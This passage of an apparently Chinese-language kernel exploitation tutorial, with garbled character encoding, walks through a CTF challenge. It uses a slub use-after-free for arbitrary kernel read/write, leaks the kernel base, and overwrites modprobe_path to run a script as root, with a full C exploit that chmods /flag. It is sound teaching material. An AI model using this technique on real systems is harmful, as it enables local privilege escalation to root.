<h4 id="Step-I-å®ç°å†…æ ¸ä»»æ„åœ°å€è¯»å†™"><a href="#Step-I-å®ç°å†…æ ¸ä»»æ„åœ°å€è¯»å†™" class="headerlink" title="Step.I - å®ç°å†…æ ¸ä»»æ„åœ°å€è¯»å†™"></a>Step.I - å®ç°å†…æ ¸ä»»æ„åœ°å€è¯»å†™</h4><p>æˆ‘ä»¬å…ˆçœ‹çœ‹èƒ½å¤Ÿåˆ©ç”¨ UAF è·å–åˆ°ä»€ä¹ˆä¿¡æ¯ï¼Œç»ç¬”è€…å¤šæ¬¡å°è¯•å¯ä»¥å‘ç°å½“æˆ‘ä»¬å°† buf é‡Šæ”¾æ‰ä¹‹åè¯»å–å…¶ä¸­æ•°æ®æ—¶å…¶å‰ 8 å­—èŠ‚éƒ½æ˜¯ä¸€ä¸ª<strong>ä½äºå†…æ ¸å †ä¸Šçš„æŒ‡é’ˆ</strong>ï¼Œä½†é€šå¸¸æœ‰ç€ä¸åŒçš„é¡µå†…åç§»ï¼Œè¿™è¯´æ˜ï¼š</p>
<ul>
<li>è¯¥ kmem_cache çš„ offset ä¸º 0</li>
<li>è¯¥ kernel æœªå¼€å¯ HARDENED_FREELIST ä¿æŠ¤</li>
<li>è¯¥ kernel å¼€å¯äº† RANDOM_FREELIST ä¿æŠ¤</li>
</ul>
<p>freelist éšæœºåŒ–ä¿æŠ¤å¹¶éæ˜¯ä¸€ä¸ªè¿è¡Œæ—¶ä¿æŠ¤ï¼Œè€Œæ˜¯åœ¨ä¸º slub åˆ†é…é¡µé¢æ—¶ä¼šå°†é¡µé¢å†…çš„ object æŒ‡é’ˆéšæœºæ‰“ä¹±ï¼Œ<strong>ä½†æ˜¯åœ¨åé¢çš„åˆ†é…é‡Šæ”¾ä¸­ä¾ç„¶éµå¾ªç€åè¿›å…ˆå‡ºçš„åŸåˆ™</strong>ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥å…ˆè·å¾—ä¸€ä¸ª object çš„ UAFï¼Œä¿®æ”¹å…¶ next ä¸ºæˆ‘ä»¬æƒ³è¦åˆ†é…çš„åœ°å€ï¼Œä¹‹åæˆ‘ä»¬è¿ç»­è¿›è¡Œä¸¤æ¬¡åˆ†é…<strong>ä¾¿èƒ½å¤ŸæˆåŠŸè·å¾—ç›®æ ‡åœ°å€ä¸Šçš„ object ï¼Œå®ç°ä»»æ„åœ°å€è¯»å†™</strong></p>
<p>ä½†è¿™ä¹ˆåšæœ‰ç€ä¸€ä¸ªå°é—®é¢˜ï¼Œå½“æˆ‘ä»¬åˆ†é…åˆ°ç›®æ ‡åœ°å€æ—¶<strong>ç›®æ ‡åœ°å€å‰ 8 å­—èŠ‚çš„æ•°æ®ä¼šè¢«å†™å…¥ freelistï¼Œè€Œè¿™é€šå¸¸å¹¶éä¸€ä¸ªæœ‰æ•ˆçš„åœ°å€</strong>ï¼Œä»è€Œå¯¼è‡´ kernel panicï¼Œå› æ­¤æˆ‘ä»¬åº”å½“å°½é‡é€‰å–ç›®æ ‡åœ°å€å¾€å‰çš„ä¸€ä¸ªæœ‰ç€ 8 å­—èŠ‚ 0 çš„åŒºåŸŸï¼Œä»è€Œä½¿å¾— freelist è·å¾—ä¸€ä¸ª NULL æŒ‡é’ˆï¼Œä¿ƒä½¿ kmem_cache å‘ buddy system è¯·æ±‚ä¸€ä¸ªæ–°çš„ slubï¼Œè¿™æ ·å°±ä¸ä¼šå‘ç”Ÿ crash</p>
<blockquote>
<p>å¯èƒ½æœ‰ç»†å¿ƒçš„åŒå­¦å‘ç°äº†ï¼šåŸæ¥çš„ slub ä¸Šé¢è¿˜æœ‰ä¸€å®šæ•°é‡çš„ç©ºé—² objectï¼Œç›´æ¥ä¸¢å¼ƒçš„è¯<strong>ä¼šå¯¼è‡´å†…å­˜æ³„æ¼çš„å‘ç”Ÿ</strong>ï¼Œä½†é¦–å…ˆè¿™ä¸€å°éƒ¨åˆ†å†…å­˜çš„æ³„éœ²å¹¶ä¸ä¼šé€ æˆè´Ÿé¢çš„å½±å“ï¼Œå…¶æ¬¡<strong>è¿™ä¹Ÿä¸æ˜¯æˆ‘ä»¬ä½œä¸ºæ”»å‡»è€…åº”è¯¥å…³æ³¨çš„é—®é¢˜</strong>ï¼ˆç¬‘ï¼‰</p>
</blockquote>
<h4 id="Step-II-æ³„éœ²å†…æ ¸åŸºåœ°å€"><a href="#Step-II-æ³„éœ²å†…æ ¸åŸºåœ°å€" class="headerlink" title="Step.II - æ³„éœ²å†…æ ¸åŸºåœ°å€"></a>Step.II - æ³„éœ²å†…æ ¸åŸºåœ°å€</h4><p>æ¥ä¸‹æ¥æˆ‘ä»¬è€ƒè™‘å¦‚ä½•æ³„éœ²å†…æ ¸åŸºå€ï¼Œè™½ç„¶é¢˜ç›®æ–°å»ºçš„ <code>kmem_cache</code> ä¼šé»˜è®¤ä¸ <code>kmalloc-192</code> åˆå¹¶ï¼Œä½†ä¸ºäº†å°Šé‡å‡ºé¢˜äººæˆ‘ä»¬è¿˜æ˜¯å°†å…¶å½“ä½œä¸€ä¸ªç‹¬ç«‹çš„ <code>kmem_cache</code> æ¥å®Œæˆåˆ©ç”¨ï¼ˆç¬‘ï¼‰</p>
<p>åœ¨å†…æ ¸â€œå †åŸºå€â€ï¼ˆ<code>page_offset_base</code>ï¼‰ + <code>0x9d000</code> å¤„å­˜æ”¾ç€ <code>secondary_startup_64</code> å‡½æ•°çš„åœ°å€ï¼Œè€Œæˆ‘ä»¬å¯ä»¥ä» free object çš„ next æŒ‡é’ˆè·å¾—ä¸€ä¸ªå †ä¸Šåœ°å€ï¼Œä»è€Œå»çŒœæµ‹å †çš„åŸºå€ï¼Œä¹‹ååˆ†é…åˆ°ä¸€ä¸ª <code>å †åŸºå€ + 0x9d000</code> å¤„çš„ object ä»¥æ³„éœ²å†…æ ¸åŸºå€ï¼Œè¿™ä¸ªåœ°å€å‰é¢åˆšå¥½æœ‰ä¸€ç‰‡ä¸º NULL çš„åŒºåŸŸæ–¹ä¾¿æˆ‘ä»¬åˆ†é…</p>
<p>è‹¥æ˜¯æ²¡æœ‰çŒœä¸­ï¼Œç¬”è€…è®¤ä¸ºç›´æ¥é‡è¯•å³å¯ï¼Œä½†è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯æˆ‘ä»¬ä¸èƒ½å¤Ÿç›´æ¥é€€å‡ºï¼Œè€Œåº”å½“ä¿ç•™åŸè¿›ç¨‹çš„æ–‡ä»¶æè¿°ç¬¦æ‰“å¼€ï¼Œå¦åˆ™ä¼šåœ¨é€€å‡ºè¿›ç¨‹æ—¶è§¦å‘ slub çš„ double free æ£€æµ‹ï¼Œä¸è¿‡ç»ç¬”è€…æµ‹éªŒå¤§éƒ¨åˆ†æƒ…å†µä¸‹éƒ½èƒ½å¤ŸçŒœä¸­å †åŸºå€</p>
<h4 id="Step-III-ä¿®æ”¹-modprobe-path-ä»¥-root-æ‰§è¡Œç¨‹åº"><a href="#Step-III-ä¿®æ”¹-modprobe-path-ä»¥-root-æ‰§è¡Œç¨‹åº" class="headerlink" title="Step.III - ä¿®æ”¹ modprobe_path ä»¥ root æ‰§è¡Œç¨‹åº"></a>Step.III - ä¿®æ”¹ modprobe_path ä»¥ root æ‰§è¡Œç¨‹åº</h4><p>æ¥ä¸‹æ¥æˆ‘ä»¬è€ƒè™‘å¦‚ä½•é€šè¿‡ä»»æ„åœ°å€å†™å®Œæˆåˆ©ç”¨ï¼Œæ¯”è¾ƒå¸¸è§„çš„åšæ³•æ˜¯è¦†å†™å†…æ ¸ä¸­çš„ä¸€äº›å…¨å±€çš„å¯å†™çš„å‡½æ•°è¡¨ï¼ˆä¾‹å¦‚ <code>n_tty_ops</code>ï¼‰æ¥åŠ«æŒå†…æ ¸æ‰§è¡Œæµï¼Œè¿™é‡Œç¬”è€…é€‰æ‹©è¦†å†™ <code>modprobe_path</code> ä»è€Œä»¥ root æ‰§è¡Œç¨‹åº</p>
<p>å½“æˆ‘ä»¬å°è¯•å»æ‰§è¡Œï¼ˆexecveï¼‰ä¸€ä¸ªéæ³•çš„æ–‡ä»¶ï¼ˆfile magic not foundï¼‰ï¼Œå†…æ ¸ä¼šç»å†å¦‚ä¸‹è°ƒç”¨é“¾ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c">entry_SYSCALL_64()<br>    sys_execve()<br>        do_execve()<br>            do_execveat_common()<br>                bprm_execve()<br>                    exec_binprm()<br>                        search_binary_handler()<br>                            __request_module() <span class="hljs-comment">// wrapped as request_module</span><br>                                call_modprobe()<br></code></pre></td></tr></table></figure>

<p>å…¶ä¸­ <code>call_modprobe()</code> å®šä¹‰äº <code>kernel/kmod.c</code>ï¼Œæˆ‘ä»¬ä¸»è¦å…³æ³¨è¿™éƒ¨åˆ†ä»£ç ï¼ˆä»¥ä¸‹æ¥ç€å†…æ ¸æºç 5.14ï¼‰ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">call_modprobe</span><span class="hljs-params">(<span class="hljs-type">char</span> *module_name, <span class="hljs-type">int</span> wait)</span><br>&#123;<br>	<span class="hljs-comment">//...</span><br>	argv[<span class="hljs-number">0</span>] = modprobe_path;<br>	argv[<span class="hljs-number">1</span>] = <span class="hljs-string">&quot;-q&quot;</span>;<br>	argv[<span class="hljs-number">2</span>] = <span class="hljs-string">&quot;--&quot;</span>;<br>	argv[<span class="hljs-number">3</span>] = module_name;	<span class="hljs-comment">/* check free_modprobe_argv() */</span><br>	argv[<span class="hljs-number">4</span>] = <span class="hljs-literal">NULL</span>;<br><br>	info = call_usermodehelper_setup(modprobe_path, argv, envp, GFP_KERNEL,<br>					 <span class="hljs-literal">NULL</span>, free_modprobe_argv, <span class="hljs-literal">NULL</span>);<br>	<span class="hljs-keyword">if</span> (!info)<br>		<span class="hljs-keyword">goto</span> free_module_name;<br><br>	<span class="hljs-keyword">return</span> call_usermodehelper_exec(info, wait | UMH_KILLABLE);<br>	<span class="hljs-comment">//...</span><br></code></pre></td></tr></table></figure>

<p>åœ¨è¿™é‡Œè°ƒç”¨äº†å‡½æ•° <code>call_usermodehelper_exec()</code> å°† <code>modprobe_path</code> ä½œä¸ºå¯æ‰§è¡Œæ–‡ä»¶è·¯å¾„ä»¥ root æƒé™å°†å…¶æ‰§è¡Œï¼Œè¿™ä¸ªåœ°å€ä¸Šé»˜è®¤å­˜å‚¨çš„å€¼ä¸º<code>/sbin/modprobe</code></p>
<p>æˆ‘ä»¬ä¸éš¾æƒ³åˆ°çš„æ˜¯ï¼šè‹¥æ˜¯æˆ‘ä»¬èƒ½å¤ŸåŠ«æŒ modprobe_pathï¼Œå°†å…¶æ”¹å†™ä¸ºæˆ‘ä»¬æŒ‡å®šçš„æ¶æ„è„šæœ¬çš„è·¯å¾„ï¼Œéšåæˆ‘ä»¬å†æ‰§è¡Œä¸€ä¸ªéæ³•æ–‡ä»¶ï¼Œ<strong>å†…æ ¸å°†ä¼šä»¥ root æƒé™æ‰§è¡Œæˆ‘ä»¬çš„æ¶æ„è„šæœ¬</strong></p>
<h3 id="â‘¢-FINAL-EXPLOIT-2"><a href="#â‘¢-FINAL-EXPLOIT-2" class="headerlink" title="â‘¢ FINAL EXPLOIT"></a>â‘¢ FINAL EXPLOIT</h3><p>æœ€åçš„ exp å¦‚ä¸‹ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MODPROBE_PATH 0xffffffff82444700</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Data</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">size_t</span> *ptr;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> offset;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> length;<br>&#125;;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ROOT_SCRIPT_PATH  <span class="hljs-string">&quot;/home/getshell&quot;</span></span><br><span class="hljs-type">char</span> root_cmd[] = <span class="hljs-string">&quot;#!/bin/sh\nchmod 777 /flag&quot;</span>;<br><br><span class="hljs-comment">/* bind the process to specific core */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">bindCore</span><span class="hljs-params">(<span class="hljs-type">int</span> core)</span><br>&#123;<br>    <span class="hljs-type">cpu_set_t</span> cpu_set;<br><br>    CPU_ZERO(&amp;cpu_set);<br>    CPU_SET(core, &amp;cpu_set);<br>    sched_setaffinity(getpid(), <span class="hljs-keyword">sizeof</span>(cpu_set), &amp;cpu_set);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Process binded to core \033[0m%d\n&quot;</span>, core);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">errExit</span><span class="hljs-params">(<span class="hljs-type">char</span> *msg)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">allocBuf</span><span class="hljs-params">(<span class="hljs-type">int</span> dev_fd, <span class="hljs-keyword">struct</span> Data *data)</span><br>&#123;<br>    ioctl(dev_fd, <span class="hljs-number">0x1111111</span>, data);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">editBuf</span><span class="hljs-params">(<span class="hljs-type">int</span> dev_fd, <span class="hljs-keyword">struct</span> Data *data)</span><br>&#123;<br>    ioctl(dev_fd, <span class="hljs-number">0x6666666</span>, data);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">readBuf</span><span class="hljs-params">(<span class="hljs-type">int</span> dev_fd, <span class="hljs-keyword">struct</span> Data *data)</span><br>&#123;<br>    ioctl(dev_fd, <span class="hljs-number">0x7777777</span>, data);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    <span class="hljs-type">int</span> dev_fd[<span class="hljs-number">5</span>], root_script_fd, flag_fd;<br>    <span class="hljs-type">size_t</span> kernel_heap_leak, kernel_text_leak;<br>    <span class="hljs-type">size_t</span> kernel_base, kernel_offset, page_offset_base;<br>    <span class="hljs-type">char</span> flag[<span class="hljs-number">0x100</span>];<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Data</span> <span class="hljs-title">data</span>;</span><br><br>    <span class="hljs-comment">/* fundamental works */</span><br>    bindCore(<span class="hljs-number">0</span>);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">5</span>; i++) &#123;<br>        dev_fd[i] = open(<span class="hljs-string">&quot;/dev/xkmod&quot;</span>, O_RDONLY);<br>    &#125;<br><br>    <span class="hljs-comment">/* create fake modprobe_path file */</span><br>    root_script_fd = open(ROOT_SCRIPT_PATH, O_RDWR | O_CREAT);<br>    write(root_script_fd, root_cmd, <span class="hljs-keyword">sizeof</span>(root_cmd));<br>    close(root_script_fd);<br>    system(<span class="hljs-string">&quot;chmod +x &quot;</span> ROOT_SCRIPT_PATH);<br><br>    <span class="hljs-comment">/* construct UAF */</span><br>    data.ptr = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1000</span>);<br>    data.offset = <span class="hljs-number">0</span>;<br>    data.length = <span class="hljs-number">0x50</span>;<br>    <span class="hljs-built_in">memset</span>(data.ptr, <span class="hljs-number">0</span>, <span class="hljs-number">0x1000</span>);<br><br>    allocBuf(dev_fd[<span class="hljs-number">0</span>], &amp;data);<br>    editBuf(dev_fd[<span class="hljs-number">0</span>], &amp;data);<br>    close(dev_fd[<span class="hljs-number">0</span>]);<br><br>    <span class="hljs-comment">/* leak kernel heap addr and guess the page_offset_base */</span><br>    readBuf(dev_fd[<span class="hljs-number">1</span>], &amp;data);<br>    kernel_heap_leak = data.ptr[<span class="hljs-number">0</span>];<br>    page_offset_base = kernel_heap_leak &amp; <span class="hljs-number">0xfffffffff0000000</span>;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] kernel heap leak: 0x%lx\n&quot;</span>, kernel_heap_leak);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[!] GUESSING page_offset_base: 0x%lx\n&quot;</span>, page_offset_base);<br><br>    <span class="hljs-comment">/* try to alloc fake chunk at (page_offset_base + 0x9d000 - 0x10) */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] leaking kernel base...&quot;</span>);<br><br>    data.ptr[<span class="hljs-number">0</span>] = page_offset_base + <span class="hljs-number">0x9d000</span> - <span class="hljs-number">0x10</span>;<br>    data.offset = <span class="hljs-number">0</span>;<br>    data.length = <span class="hljs-number">8</span>;<br><br>    editBuf(dev_fd[<span class="hljs-number">1</span>], &amp;data);<br>    allocBuf(dev_fd[<span class="hljs-number">1</span>], &amp;data);<br>    allocBuf(dev_fd[<span class="hljs-number">1</span>], &amp;data);<br><br>    data.length = <span class="hljs-number">0x40</span>;<br>    readBuf(dev_fd[<span class="hljs-number">1</span>], &amp;data);<br>    <span class="hljs-keyword">if</span> ((data.ptr[<span class="hljs-number">2</span>] &amp; <span class="hljs-number">0xfff</span>) != <span class="hljs-number">0x30</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[!] invalid data leak: 0x%lx\n&quot;</span>, data.ptr[<span class="hljs-number">2</span>]);<br>        errExit(<span class="hljs-string">&quot;\033[31m\033[1m[x] FAILED TO HIT page_offset_base! TRY AGAIN!&quot;</span>);<br>    &#125;<br><br>    kernel_base = data.ptr[<span class="hljs-number">2</span>] - <span class="hljs-number">0x30</span>;<br>    kernel_offset = kernel_base - <span class="hljs-number">0xffffffff81000000</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] kernel base:\033[0m 0x%lx\n&quot;</span>, kernel_base);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] kernel offset:\033[0m 0x%lx\n&quot;</span>, kernel_offset);<br><br>    <span class="hljs-comment">/* hijack the modprobe_path, we&#x27;ll let it requesting new slub page for it */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] hijacking modprobe_path...&quot;</span>);<br><br>    allocBuf(dev_fd[<span class="hljs-number">1</span>], &amp;data);<br>    close(dev_fd[<span class="hljs-number">1</span>]);<br><br>    data.ptr[<span class="hljs-number">0</span>] = kernel_offset + MODPROBE_PATH - <span class="hljs-number">0x10</span>;<br>    data.offset = <span class="hljs-number">0</span>;<br>    data.length = <span class="hljs-number">0x8</span>;<br><br>    editBuf(dev_fd[<span class="hljs-number">2</span>], &amp;data);<br>    allocBuf(dev_fd[<span class="hljs-number">2</span>], &amp;data);<br>    allocBuf(dev_fd[<span class="hljs-number">2</span>], &amp;data);<br><br>    <span class="hljs-built_in">strcpy</span>((<span class="hljs-type">char</span> *) &amp;data.ptr[<span class="hljs-number">2</span>], ROOT_SCRIPT_PATH);<br>    data.length = <span class="hljs-number">0x30</span>;<br>    editBuf(dev_fd[<span class="hljs-number">2</span>], &amp;data);<br><br>    <span class="hljs-comment">/* trigger the fake modprobe_path */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] trigerring fake modprobe_path...&quot;</span>);<br><br>    system(<span class="hljs-string">&quot;echo -e &#x27;\\xff\\xff\\xff\\xff&#x27; &gt; /home/fake&quot;</span>);<br>    system(<span class="hljs-string">&quot;chmod +x /home/fake&quot;</span>);<br>    system(<span class="hljs-string">&quot;/home/fake&quot;</span>);<br><br>    <span class="hljs-comment">/* read flag */</span><br>    <span class="hljs-built_in">memset</span>(flag, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(flag));<br>    <br>    flag_fd = open(<span class="hljs-string">&quot;/flag&quot;</span>, O_RDWR);<br>    <span class="hljs-keyword">if</span> (flag_fd &lt; <span class="hljs-number">0</span>) &#123;<br>        errExit(<span class="hljs-string">&quot;failed to chmod flag!&quot;</span>);<br>    &#125;<br><br>    read(flag_fd, flag, <span class="hljs-keyword">sizeof</span>(flag));<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Got flag: \033[0m%s\n&quot;</span>, flag);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯è·å¾— flagï¼Œä¸è¿‡åœ¨æ¨æµ‹ <code>page_offset_base</code> åœ°å€æ—¶æœ‰ä¸€å®šæ¦‚ç‡å¤±è´¥ï¼š</p>
<p><img src="https://s2.loli.net/2023/02/07/ZyLc4zqgkfjOIBt.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<h2 id="bypass-Slab-Freelist-Hardened"><a href="#bypass-Slab-Freelist-Hardened" class="headerlink" title="bypass Slab Freelist Hardened"></a>bypass Slab Freelist Hardened</h2><p>ç±»ä¼¼äºç”¨æˆ·æ€ä¸‹ glibc ä¸­çš„ safe-linking æœºåˆ¶ï¼Œåœ¨å†…æ ¸ä¸­çš„ slab&#x2F;slub åˆ†é…å™¨å½“ä¸­ä¹Ÿå­˜åœ¨ç€ç±»ä¼¼çš„æœºåˆ¶ä¿æŠ¤ç€ freelistâ€”â€” <code>SLAB_FREELIST_HARDENED</code>ï¼š</p>
<p>å¯¹äº freelist ä¸­å­˜å‚¨çš„ objectï¼Œå…¶ fd æ‰€å­˜å‚¨çš„å€¼ä¸º<strong>current object addr ä¸ next object addr ä¸ slub cookie</strong>è¿™ä¸‰ä¸ªå€¼<strong>å¼‚æˆ–</strong>æ‰€å¾—çš„å€¼ï¼ˆé«˜ç‰ˆæœ¬å†…æ ¸ä¼¼ä¹è¿˜æœ‰ä¸ªç§»ä½ï¼‰ï¼Œè¿™è¦æ±‚æˆ‘ä»¬åœ¨æ„é€ ä»»æ„åœ°å€å†™æ—¶éœ€è¦åŒæ—¶çŸ¥é“è¿™ä¸‰ä¸ªå€¼æ‰èƒ½é€šè¿‡å†…æ ¸ä¸­çš„æ£€æµ‹</p>
<p>åœ¨ç¼–è¯‘å†…æ ¸æ—¶åœ¨ <code>.config</code> ä¸­æ·»åŠ ç¼–è¯‘é€‰é¡¹ <code>CONFIG_SLAB_FREELIST_HARDENED=y</code> å³å¯å¼€å¯è¿™ç§åŠ å›ºæœºåˆ¶ï¼ˆç›®å‰æ–°ç‰ˆå†…æ ¸ä¼¼ä¹é»˜è®¤å¼€å¯ï¼‰</p>
<h3 id="ä¾‹é¢˜ï¼šå¼ºç½‘æ¯2021çº¿ä¸Šèµ›-notebook-1"><a href="#ä¾‹é¢˜ï¼šå¼ºç½‘æ¯2021çº¿ä¸Šèµ›-notebook-1" class="headerlink" title="ä¾‹é¢˜ï¼šå¼ºç½‘æ¯2021çº¿ä¸Šèµ› - notebook"></a>ä¾‹é¢˜ï¼šå¼ºç½‘æ¯2021çº¿ä¸Šèµ› - notebook</h3><h1 id="0x08-Kernel-Heap-Heap-Overflow"><a href="#0x08-Kernel-Heap-Heap-Overflow" class="headerlink" title="0x08.Kernel Heap - Heap Overflow"></a>0x08.Kernel Heap - Heap Overflow</h1><p><strong>æº¢å‡º</strong>ï¼ˆOverflowï¼‰å‘æ¥éƒ½æ˜¯æœ€ä¸ºç»å…¸ã€ä¹Ÿæ˜¯æœ€ä¸ºå¸¸è§çš„ä¸€ç§æ¼æ´ï¼Œæ­¤å‰æˆ‘ä»¬å·²ç»æ¥è§¦äº†ä½äºå†…æ ¸æ ˆä¸Šçš„æº¢å‡ºæ¼æ´ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬å¼€å§‹æ·±å…¥å†…æ ¸åŠ¨æ€å†…å­˜åŒºä¸Šçš„æº¢å‡ºæ¼æ´</p>
<h2 id="ä¾‹é¢˜ï¼šInCTF2021-Kqueue"><a href="#ä¾‹é¢˜ï¼šInCTF2021-Kqueue" class="headerlink" title="ä¾‹é¢˜ï¼šInCTF2021 - Kqueue"></a>ä¾‹é¢˜ï¼šInCTF2021 - Kqueue</h2><!--\*CTF2019 - hackme-->

<blockquote>
<p>æ®è¯´ InCTF å›½é™…èµ›ä¸ºå°åº¦çš„â€œå¼ºç½‘æ¯â€â€¦</p>
